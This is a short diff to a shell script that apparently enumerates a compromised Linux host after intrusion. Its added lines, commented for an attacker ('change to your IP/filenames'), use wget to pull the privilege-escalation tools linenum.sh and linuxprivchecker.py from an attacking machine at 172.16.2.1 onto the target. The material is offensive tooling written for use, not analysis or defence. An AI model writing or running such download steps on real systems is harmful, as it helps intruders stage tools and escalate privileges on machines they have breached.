@@ -135,3 +135,11 @@ echo ""
 echo "-----UNMOUNTED FILE SYSTEMS-----"
 cat /etc/fstab
 echo ""
+
+#if your http server is still running on attacking machine, 
+#we'll grab the other scripts if we need more enumeration
+#change to your IP/filenames
+echo "-----WGET BACK TO HOST FOR OTHER SCRIPTS-----"
+wget -O linenum.sh http://172.16.2.1/linenum.sh
+wget -O privchecker.py http://172.16.2.1/linuxprivchecker.py
+echo ""
